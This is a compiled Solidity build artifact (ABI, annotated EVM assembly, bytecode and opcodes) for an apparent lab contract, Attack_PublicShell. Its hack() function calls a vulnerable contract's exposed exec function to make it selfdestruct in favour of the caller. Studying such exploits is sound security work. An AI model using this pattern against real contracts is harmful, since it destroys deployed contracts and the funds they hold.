{
	"S/Shell/Shell.sol": {
		"Attack_PublicShell": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "contract PublicShellVuln",
							"name": "_t",
							"type": "address"
						}
					],
					"stateMutability": "nonpayable",
					"type": "constructor"
				},
				{
					"inputs": [],
					"name": "hack",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "target",
					"outputs": [
						{
							"internalType": "contract PublicShellVuln",
							"name": "",
							"type": "address"
						}
					],
					"stateMutability": "view",
					"type": "function"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"S/Shell/Shell.sol\":790:1099  contract Attack_PublicShell {... */\n  mstore(0x40, 0x80)\n    /* \"S/Shell/Shell.sol\":859:907  constructor(PublicShellVuln _t) { target = _t; } */\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  mload(0x40)\n  sub(codesize, bytecodeSize)\n  dup1\n  bytecodeSize\n  dup4\n  codecopy\n  dup2\n  dup2\n  add\n  0x40\n  mstore\n  dup2\n  add\n  swap1\n  tag_2\n  swap2\n  swap1\n  tag_3\n  jump\t// in\ntag_2:\n    /* \"S/Shell/Shell.sol\":902:904  _t */\n  dup1\n    /* \"S/Shell/Shell.sol\":893:899  target */\n  0x00\n  dup1\n    /* \"S/Shell/Shell.sol\":893:904  target = _t */\n  0x0100\n  exp\n  dup2\n  sload\n  dup2\n  0xffffffffffffffffffffffffffffffffffffffff\n  mul\n  not\n  and\n  swap1\n  dup4\n  0xffffffffffffffffffffffffffffffffffffffff\n  and\n  mul\n  or\n  swap1\n  sstore\n  pop\n    /* \"S/Shell/Shell.sol\":859:907  constructor(PublicShellVuln _t) { target = _t; } */\n  pop\n    /* \"S/Shell/Shell.sol\":790:1099  contract Attack_PublicShell {... */\n  jump(tag_6)\n    /* \"#utility.yul\":88:205   */\ntag_8:\n    /* \"#utility.yul\":197:198   */\n  0x00\n    /* \"#utility.yul\":194:195   */\n  dup1\n    /* \"#utility.yul\":187:199   */\n  revert\n    /* \"#utility.yul\":334:460   */\ntag_10:\n    /* \"#utility.yul\":371:378   */\n  0x00\n    /* \"#utility.yul\":411:453   */\n  0xffffffffffffffffffffffffffffffffffffffff\n    /* \"#utility.yul\":404:409   */\n  dup3\n    /* \"#utility.yul\":400:454   */\n  and\n    /* \"#utility.yul\":389:454   */\n  swap1\n  pop\n    /* \"#utility.yul\":334:460   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":466:562   */\ntag_11:\n    /* \"#utility.yul\":503:510   */\n  0x00\n    /* \"#utility.yul\":532:556   */\n  tag_21\n    /* \"#utility.yul\":550:555   */\n  dup3\n    /* \"#utility.yul\":532:556   */\n  tag_10\n  jump\t// in\ntag_21:\n    /* \"#utility.yul\":521:556   */\n  swap1\n  pop\n    /* \"#utility.yul\":466:562   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":568:686   */\ntag_12:\n    /* \"#utility.yul\":627:634   */\n  0x00\n    /* \"#utility.yul\":656:680   */\n  tag_23\n    /* \"#utility.yul\":674:679   */\n  dup3\n    /* \"#utility.yul\":656:680   */\n  tag_11\n  jump\t// in\ntag_23:\n    /* \"#utility.yul\":645:680   */\n  swap1\n  pop\n    /* \"#utility.yul\":568:686   */\n  swap2\n  swap1\n  pop\n  jump\t// out\n    /* \"#utility.yul\":692:858   */\ntag_13:\n    /* \"#utility.yul\":787:833   */\n  tag_25\n    /* \"#utility.yul\":827:832   */\n  dup2\n    /* \"#utility.yul\":787:833   */\n  tag_12\n  jump\t// in\ntag_25:\n    /* \"#utility.yul\":780:785   */\n  dup2\n    /* \"#utility.yul\":777:834   */\n  eq\n    /* \"#utility.yul\":767:852   */\n  tag_26\n  jumpi\n    /* \"#utility.yul\":848:849   */\n  0x00\n    /* \"#utility.yul\":845:846   */\n  dup1\n    /* \"#utility.yul\":838:850   */\n  revert\n    /* \"#utility.yul\":767:852   */\ntag_26:\n    /* \"#utility.yul\":692:858   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":864:1051   */\ntag_14:\n    /* \"#utility.yul\":943:948   */\n  0x00\n    /* \"#utility.yul\":974:980   */\n  dup2\n    /* \"#utility.yul\":968:981   */\n  mload\n    /* \"#utility.yul\":959:981   */\n  swap1\n  pop\n    /* \"#utility.yul\":990:1045   */\n  tag_28\n    /* \"#utility.yul\":1039:1044   */\n  dup2\n    /* \"#utility.yul\":990:1045   */\n  tag_13\n  jump\t// in\ntag_28:\n    /* \"#utility.yul\":864:1051   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":1057:1452   */\ntag_3:\n    /* \"#utility.yul\":1149:1155   */\n  0x00\n    /* \"#utility.yul\":1198:1200   */\n  0x20\n    /* \"#utility.yul\":1186:1195   */\n  dup3\n    /* \"#utility.yul\":1177:1184   */\n  dup5\n    /* \"#utility.yul\":1173:1196   */\n  sub\n    /* \"#utility.yul\":1169:1201   */\n  slt\n    /* \"#utility.yul\":1166:1285   */\n  iszero\n  tag_30\n  jumpi\n    /* \"#utility.yul\":1204:1283   */\n  tag_31\n  tag_8\n  jump\t// in\ntag_31:\n    /* \"#utility.yul\":1166:1285   */\ntag_30:\n    /* \"#utility.yul\":1324:1325   */\n  0x00\n    /* \"#utility.yul\":1349:1435   */\n  tag_32\n    /* \"#utility.yul\":1427:1434   */\n  dup5\n    /* \"#utility.yul\":1418:1424   */\n  dup3\n    /* \"#utility.yul\":1407:1416   */\n  dup6\n    /* \"#utility.yul\":1403:1425   */\n  add\n    /* \"#utility.yul\":1349:1435   */\n  tag_14\n  jump\t// in\ntag_32:\n    /* \"#utility.yul\":1339:1435   */\n  swap2\n  pop\n    /* \"#utility.yul\":1295:1445   */\n  pop\n    /* \"#utility.yul\":1057:1452   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"S/Shell/Shell.sol\":790:1099  contract Attack_PublicShell {... */\ntag_6:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"S/Shell/Shell.sol\":790:1099  contract Attack_PublicShell {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x4de260a2\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xd4b83992\n      eq\n      tag_4\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"S/Shell/Shell.sol\":913:1097  function hack() external {... */\n    tag_3:\n      tag_5\n      tag_6\n      jump\t// in\n    tag_5:\n      stop\n        /* \"S/Shell/Shell.sol\":824:853  PublicShellVuln public target */\n    tag_4:\n      tag_7\n      tag_8\n      jump\t// in\n    tag_7:\n      mload(0x40)\n      tag_9\n      swap2\n      swap1\n      tag_10\n      jump\t// in\n    tag_9:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"S/Shell/Shell.sol\":913:1097  function hack() external {... */\n    tag_6:\n        /* \"S/Shell/Shell.sol\":989:1003  bytes memory p */\n      0x00\n        /* \"S/Shell/Shell.sol\":1055:1065  msg.sender */\n      caller\n        /* \"S/Shell/Shell.sol\":1006:1066  abi.encodeWithSignature(\"selfdestruct(address)\", msg.sender) */\n      add(0x24, mload(0x40))\n      tag_12\n      swap2\n      swap1\n      tag_13\n      jump\t// in\n    tag_12:\n      mload(0x40)\n      0x20\n      dup2\n      dup4\n      sub\n      sub\n      dup2\n      mstore\n      swap1\n      0x40\n      mstore\n      and(not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff), 0xcfc7200700000000000000000000000000000000000000000000000000000000)\n      0x20\n      dup3\n      add\n      dup1\n      mload\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n      dup4\n      dup2\n      dup4\n      and\n      or\n      dup4\n      mstore\n      pop\n      pop\n      pop\n      pop\n        /* \"S/Shell/Shell.sol\":989:1066  bytes memory p = abi.encodeWithSignature(\"selfdestruct(address)\", msg.sender) */\n      swap1\n      pop\n        /* \"S/Shell/Shell.sol\":1076:1082  target */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"S/Shell/Shell.sol\":1076:1087  target.exec */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x55f86501\n        /* \"S/Shell/Shell.sol\":1088:1089  p */\n      dup3\n        /* \"S/Shell/Shell.sol\":1076:1090  target.exec(p) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_14\n      swap2\n      swap1\n      tag_15\n      jump\t// in\n    tag_14:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_16\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_16:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_18\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_18:\n      pop\n      pop\n      pop\n      pop\n        /* \"S/Shell/Shell.sol\":938:1097  {... */\n      pop\n        /* \"S/Shell/Shell.sol\":913:1097  function hack() external {... */\n      jump\t// out\n        /* \"S/Shell/Shell.sol\":824:853  PublicShellVuln public target */\n    tag_8:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"#utility.yul\":7:133   */\n    tag_19:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":84:126   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":77:82   */\n      dup3\n        /* \"#utility.yul\":73:127   */\n      and\n        /* \"#utility.yul\":62:127   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:133   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":139:199   */\n    tag_20:\n        /* \"#utility.yul\":167:170   */\n      0x00\n        /* \"#utility.yul\":188:193   */\n      dup2\n        /* \"#utility.yul\":181:193   */\n      swap1\n      pop\n        /* \"#utility.yul\":139:199   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":205:347   */\n    tag_21:\n        /* \"#utility.yul\":255:264   */\n      0x00\n        /* \"#utility.yul\":288:341   */\n      tag_36\n        /* \"#utility.yul\":306:340   */\n      tag_37\n        /* \"#utility.yul\":315:339   */\n      tag_38\n        /* \"#utility.yul\":333:338   */\n      dup5\n        /* \"#utility.yul\":315:339   */\n      tag_19\n      jump\t// in\n    tag_38:\n        /* \"#utility.yul\":306:340   */\n      tag_20\n      jump\t// in\n    tag_37:\n        /* \"#utility.yul\":288:341   */\n      tag_19\n      jump\t// in\n    tag_36:\n        /* \"#utility.yul\":275:341   */\n      swap1\n      pop\n        /* \"#utility.yul\":205:347   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":353:479   */\n    tag_22:\n        /* \"#utility.yul\":403:412   */\n      0x00\n        /* \"#utility.yul\":436:473   */\n      tag_40\n        /* \"#utility.yul\":467:472   */\n      dup3\n        /* \"#utility.yul\":436:473   */\n      tag_21\n      jump\t// in\n    tag_40:\n        /* \"#utility.yul\":423:473   */\n      swap1\n      pop\n        /* \"#utility.yul\":353:479   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":485:633   */\n    tag_23:\n        /* \"#utility.yul\":557:566   */\n      0x00\n        /* \"#utility.yul\":590:627   */\n      tag_42\n        /* \"#utility.yul\":621:626   */\n      dup3\n        /* \"#utility.yul\":590:627   */\n      tag_22\n      jump\t// in\n    tag_42:\n        /* \"#utility.yul\":577:627   */\n      swap1\n      pop\n        /* \"#utility.yul\":485:633   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":639:814   */\n    tag_24:\n        /* \"#utility.yul\":748:807   */\n      tag_44\n        /* \"#utility.yul\":801:806   */\n      dup2\n        /* \"#utility.yul\":748:807   */\n      tag_23\n      jump\t// in\n    tag_44:\n        /* \"#utility.yul\":743:746   */\n      dup3\n        /* \"#utility.yul\":736:808   */\n      mstore\n        /* \"#utility.yul\":639:814   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":820:1086   */\n    tag_10:\n        /* \"#utility.yul\":935:939   */\n      0x00\n        /* \"#utility.yul\":973:975   */\n      0x20\n        /* \"#utility.yul\":962:971   */\n      dup3\n        /* \"#utility.yul\":958:976   */\n      add\n        /* \"#utility.yul\":950:976   */\n      swap1\n      pop\n        /* \"#utility.yul\":986:1079   */\n      tag_46\n        /* \"#utility.yul\":1076:1077   */\n      0x00\n        /* \"#utility.yul\":1065:1074   */\n      dup4\n        /* \"#utility.yul\":1061:1078   */\n      add\n        /* \"#utility.yul\":1052:1058   */\n      dup5\n        /* \"#utility.yul\":986:1079   */\n      tag_24\n      jump\t// in\n    tag_46:\n        /* \"#utility.yul\":820:1086   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1092:1188   */\n    tag_25:\n        /* \"#utility.yul\":1129:1136   */\n      0x00\n        /* \"#utility.yul\":1158:1182   */\n      tag_48\n        /* \"#utility.yul\":1176:1181   */\n      dup3\n        /* \"#utility.yul\":1158:1182   */\n      tag_19\n      jump\t// in\n    tag_48:\n        /* \"#utility.yul\":1147:1182   */\n      swap1\n      pop\n        /* \"#utility.yul\":1092:1188   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1194:1312   */\n    tag_26:\n        /* \"#utility.yul\":1281:1305   */\n      tag_50\n        /* \"#utility.yul\":1299:1304   */\n      dup2\n        /* \"#utility.yul\":1281:1305   */\n      tag_25\n      jump\t// in\n    tag_50:\n        /* \"#utility.yul\":1276:1279   */\n      dup3\n        /* \"#utility.yul\":1269:1306   */\n      mstore\n        /* \"#utility.yul\":1194:1312   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1318:1540   */\n    tag_13:\n        /* \"#utility.yul\":1411:1415   */\n      0x00\n        /* \"#utility.yul\":1449:1451   */\n      0x20\n        /* \"#utility.yul\":1438:1447   */\n      dup3\n        /* \"#utility.yul\":1434:1452   */\n      add\n        /* \"#utility.yul\":1426:1452   */\n      swap1\n      pop\n        /* \"#utility.yul\":1462:1533   */\n      tag_52\n        /* \"#utility.yul\":1530:1531   */\n      0x00\n        /* \"#utility.yul\":1519:1528   */\n      dup4\n        /* \"#utility.yul\":1515:1532   */\n      add\n        /* \"#utility.yul\":1506:1512   */\n      dup5\n        /* \"#utility.yul\":1462:1533   */\n      tag_26\n      jump\t// in\n    tag_52:\n        /* \"#utility.yul\":1318:1540   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1546:1644   */\n    tag_27:\n        /* \"#utility.yul\":1597:1603   */\n      0x00\n        /* \"#utility.yul\":1631:1636   */\n      dup2\n        /* \"#utility.yul\":1625:1637   */\n      mload\n        /* \"#utility.yul\":1615:1637   */\n      swap1\n      pop\n        /* \"#utility.yul\":1546:1644   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1650:1818   */\n    tag_28:\n        /* \"#utility.yul\":1733:1744   */\n      0x00\n        /* \"#utility.yul\":1767:1773   */\n      dup3\n        /* \"#utility.yul\":1762:1765   */\n      dup3\n        /* \"#utility.yul\":1755:1774   */\n      mstore\n        /* \"#utility.yul\":1807:1811   */\n      0x20\n        /* \"#utility.yul\":1802:1805   */\n      dup3\n        /* \"#utility.yul\":1798:1812   */\n      add\n        /* \"#utility.yul\":1783:1812   */\n      swap1\n      pop\n        /* \"#utility.yul\":1650:1818   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1824:1963   */\n    tag_29:\n        /* \"#utility.yul\":1913:1919   */\n      dup3\n        /* \"#utility.yul\":1908:1911   */\n      dup2\n        /* \"#utility.yul\":1903:1906   */\n      dup4\n        /* \"#utility.yul\":1897:1920   */\n      mcopy\n        /* \"#utility.yul\":1954:1955   */\n      0x00\n        /* \"#utility.yul\":1945:1951   */\n      dup4\n        /* \"#utility.yul\":1940:1943   */\n      dup4\n        /* \"#utility.yul\":1936:1952   */\n      add\n        /* \"#utility.yul\":1929:1956   */\n      mstore\n        /* \"#utility.yul\":1824:1963   */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1969:2071   */\n    tag_30:\n        /* \"#utility.yul\":2010:2016   */\n      0x00\n        /* \"#utility.yul\":2061:2063   */\n      0x1f\n        /* \"#utility.yul\":2057:2064   */\n      not\n        /* \"#utility.yul\":2052:2054   */\n      0x1f\n        /* \"#utility.yul\":2045:2050   */\n      dup4\n        /* \"#utility.yul\":2041:2055   */\n      add\n        /* \"#utility.yul\":2037:2065   */\n      and\n        /* \"#utility.yul\":2027:2065   */\n      swap1\n      pop\n        /* \"#utility.yul\":1969:2071   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2077:2450   */\n    tag_31:\n        /* \"#utility.yul\":2163:2166   */\n      0x00\n        /* \"#utility.yul\":2191:2229   */\n      tag_58\n        /* \"#utility.yul\":2223:2228   */\n      dup3\n        /* \"#utility.yul\":2191:2229   */\n      tag_27\n      jump\t// in\n    tag_58:\n        /* \"#utility.yul\":2245:2315   */\n      tag_59\n        /* \"#utility.yul\":2308:2314   */\n      dup2\n        /* \"#utility.yul\":2303:2306   */\n      dup6\n        /* \"#utility.yul\":2245:2315   */\n      tag_28\n      jump\t// in\n    tag_59:\n        /* \"#utility.yul\":2238:2315   */\n      swap4\n      pop\n        /* \"#utility.yul\":2324:2389   */\n      tag_60\n        /* \"#utility.yul\":2382:2388   */\n      dup2\n        /* \"#utility.yul\":2377:2380   */\n      dup6\n        /* \"#utility.yul\":2370:2374   */\n      0x20\n        /* \"#utility.yul\":2363:2368   */\n      dup7\n        /* \"#utility.yul\":2359:2375   */\n      add\n        /* \"#utility.yul\":2324:2389   */\n      tag_29\n      jump\t// in\n    tag_60:\n        /* \"#utility.yul\":2414:2443   */\n      tag_61\n        /* \"#utility.yul\":2436:2442   */\n      dup2\n        /* \"#utility.yul\":2414:2443   */\n      tag_30\n      jump\t// in\n    tag_61:\n        /* \"#utility.yul\":2409:2412   */\n      dup5\n        /* \"#utility.yul\":2405:2444   */\n      add\n        /* \"#utility.yul\":2398:2444   */\n      swap2\n      pop\n        /* \"#utility.yul\":2167:2450   */\n      pop\n        /* \"#utility.yul\":2077:2450   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2456:2765   */\n    tag_15:\n        /* \"#utility.yul\":2567:2571   */\n      0x00\n        /* \"#utility.yul\":2605:2607   */\n      0x20\n        /* \"#utility.yul\":2594:2603   */\n      dup3\n        /* \"#utility.yul\":2590:2608   */\n      add\n        /* \"#utility.yul\":2582:2608   */\n      swap1\n      pop\n        /* \"#utility.yul\":2654:2663   */\n      dup2\n        /* \"#utility.yul\":2648:2652   */\n      dup2\n        /* \"#utility.yul\":2644:2664   */\n      sub\n        /* \"#utility.yul\":2640:2641   */\n      0x00\n        /* \"#utility.yul\":2629:2638   */\n      dup4\n        /* \"#utility.yul\":2625:2642   */\n      add\n        /* \"#utility.yul\":2618:2665   */\n      mstore\n        /* \"#utility.yul\":2682:2758   */\n      tag_63\n        /* \"#utility.yul\":2753:2757   */\n      dup2\n        /* \"#utility.yul\":2744:2750   */\n      dup5\n        /* \"#utility.yul\":2682:2758   */\n      tag_31\n      jump\t// in\n    tag_63:\n        /* \"#utility.yul\":2674:2758   */\n      swap1\n      pop\n        /* \"#utility.yul\":2456:2765   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220f48570e0fd9d17857e83bf222350d153c4375079d2e7d2efe4b692eaec66425064736f6c634300081a0033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561000f575f80fd5b5060405161044b38038061044b833981810160405281019061003191906100e5565b805f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610110565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f6100a38261007a565b9050919050565b5f6100b482610099565b9050919050565b6100c4816100aa565b81146100ce575f80fd5b50565b5f815190506100df816100bb565b92915050565b5f602082840312156100fa576100f9610076565b5b5f610107848285016100d1565b91505092915050565b61032e8061011d5f395ff3fe608060405234801561000f575f80fd5b5060043610610034575f3560e01c80634de260a214610038578063d4b8399214610042575b5f80fd5b610040610060565b005b61004a610179565b6040516100579190610216565b60405180910390f35b5f33604051602401610072919061024f565b6040516020818303038152906040527fcfc72007000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff838183161783525050505090505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166355f86501826040518263ffffffff1660e01b815260040161014991906102d8565b5f604051808303815f87803b158015610160575f80fd5b505af1158015610172573d5f803e3d5ffd5b5050505050565b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f819050919050565b5f6101de6101d96101d48461019c565b6101bb565b61019c565b9050919050565b5f6101ef826101c4565b9050919050565b5f610200826101e5565b9050919050565b610210816101f6565b82525050565b5f6020820190506102295f830184610207565b92915050565b5f6102398261019c565b9050919050565b6102498161022f565b82525050565b5f6020820190506102625f830184610240565b92915050565b5f81519050919050565b5f82825260208201905092915050565b8281835e5f83830152505050565b5f601f19601f8301169050919050565b5f6102aa82610268565b6102b48185610272565b93506102c4818560208601610282565b6102cd81610290565b840191505092915050565b5f6020820190508181035f8301526102f081846102a0565b90509291505056fea2646970667358221220f48570e0fd9d17857e83bf222350d153c4375079d2e7d2efe4b692eaec66425064736f6c634300081a0033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x44B CODESIZE SUB DUP1 PUSH2 0x44B DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x31 SWAP2 SWAP1 PUSH2 0xE5 JUMP JUMPDEST DUP1 PUSH0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x110 JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xA3 DUP3 PUSH2 0x7A JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0xB4 DUP3 PUSH2 0x99 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xC4 DUP2 PUSH2 0xAA JUMP JUMPDEST DUP2 EQ PUSH2 0xCE JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0xDF DUP2 PUSH2 0xBB JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xFA JUMPI PUSH2 0xF9 PUSH2 0x76 JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x107 DUP5 DUP3 DUP6 ADD PUSH2 0xD1 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x32E DUP1 PUSH2 0x11D PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x34 JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x4DE260A2 EQ PUSH2 0x38 JUMPI DUP1 PUSH4 0xD4B83992 EQ PUSH2 0x42 JUMPI JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH2 0x40 PUSH2 0x60 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x4A PUSH2 0x179 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x57 SWAP2 SWAP1 PUSH2 0x216 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH0 CALLER PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH2 0x72 SWAP2 SWAP1 PUSH2 0x24F JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0xCFC7200700000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP SWAP1 POP PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x55F86501 DUP3 PUSH1 0x40 MLOAD DUP3 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x149 SWAP2 SWAP1 PUSH2 0x2D8 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x160 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x172 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP POP JUMP JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x1DE PUSH2 0x1D9 PUSH2 0x1D4 DUP5 PUSH2 0x19C JUMP JUMPDEST PUSH2 0x1BB JUMP JUMPDEST PUSH2 0x19C JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x1EF DUP3 PUSH2 0x1C4 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x200 DUP3 PUSH2 0x1E5 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x210 DUP2 PUSH2 0x1F6 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x229 PUSH0 DUP4 ADD DUP5 PUSH2 0x207 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH2 0x239 DUP3 PUSH2 0x19C JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x249 DUP2 PUSH2 0x22F JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x262 PUSH0 DUP4 ADD DUP5 PUSH2 0x240 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 DUP3 DUP3 MSTORE PUSH1 0x20 DUP3 ADD SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST DUP3 DUP2 DUP4 MCOPY PUSH0 DUP4 DUP4 ADD MSTORE POP POP POP JUMP JUMPDEST PUSH0 